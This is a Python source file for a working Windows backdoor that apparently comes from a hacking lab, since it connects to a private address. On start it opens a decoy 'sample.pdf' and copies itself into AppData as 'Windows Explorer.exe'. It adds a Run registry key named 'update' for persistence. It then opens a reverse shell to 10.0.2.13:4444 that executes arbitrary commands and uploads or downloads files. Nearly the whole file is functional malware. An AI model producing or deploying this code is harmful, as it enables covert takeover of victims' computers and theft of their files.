import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port, start=True):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        if start:
            self.run()

    def become_persistent(self):
        evil_file_location = f'{os.environ["appdata"]}\\Windows Explorer.exe'
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(
                f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run \
                    /v update /t REG_SZ /d "{evil_file_location}"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)  # str
        json_data = json_data.encode()  # bytes
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b''
        while True:
            try:
                json_data += self.connection.recv(1024)  # bytes
                json_data_str = json.loads(json_data)  # str
                return json_data_str
            except ValueError:
                continue

    def execute_system_command(self, command):  # bytes -> bytes
        return subprocess.check_output(command, shell=True,
                                       stderr=subprocess.DEVNULL,
                                       stdin=subprocess.DEVNULL)

    def change_working_directory_to(self, path):  # str -> str
        os.chdir(path)
        return f'[+] Changing working directory to {path}'

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Upload successful.'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.reliable_receive()  # str

            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_working_directory_to(
                        command[1])  # str
                elif command[0] == 'download':
                    command_result = self.read_file(command[1])
                    command_result = command_result.decode()
                elif command[0] == 'upload':
                    command_result = self.write_file(
                        command[1], command[2])
                else:
                    command_result = self.execute_system_command(
                        command)  # bytes
                    command_result = command_result.decode(
                        errors='replace')  # str
            except Exception:
                command_result = '[-] Error during command execution.'

            self.reliable_send(command_result)


file_name = sys._MEIPASS + '\sample.pdf'
subprocess.Popen(file_name, shell=True)

try:
    Backdoor('10.0.2.13', 4444)
except Exception:
    sys.exit()
